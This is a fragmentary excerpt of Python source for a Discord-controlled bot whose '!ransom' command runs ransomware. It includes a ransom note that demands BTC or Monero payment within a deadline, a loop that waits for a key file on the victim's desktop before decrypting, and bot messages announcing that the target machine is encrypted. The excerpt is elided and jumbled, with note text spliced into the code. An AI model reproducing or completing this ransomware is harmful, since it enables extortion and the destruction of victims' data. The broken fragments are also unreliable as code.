...
--> !ransom = runs a ransomware script. The bot will ask for needed info
"""
...
1. Email to {email_ransom}

2. You will recieve your personal BTC/MONERO address for payment.
   Once payment has been completed, send another email to {email_ransom} stating "PAID".
   We will check to see if payment has been paid.

3. You will receive a text file with your KEY that will unlock all your files. 
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.

4. You HAVE to pay within {ransom_amount_hours} hour(s).
        ...
        while True:
            try:
                ...
                with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    ...
                    await message.channel.send('decrypted') # Debugging/Testing
                    break
            except Exception as e:
                await message.channel.send(e) # Debugging/Testing
                pass
            time.sleep(10) # Debugging/Testing check for file on desktop ever 10 seconds
            1. Email to''' {email_ransom}''' 
await message.channel.send('Checking for PUT_ME_ON_DESKTOP.txt') # Debugging/Testing
...
def main():
    ...
    t1.start()
    await message.channel.send('> RansomWare: Attack completed on target machine and system is encrypted')
    await message.channel.send('> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine')
    t2.start()
    await message.channel.send('> RansomWare: Target machine has been un-encrypted') 
    await message.channel.send('> RansomWare: Completed') 
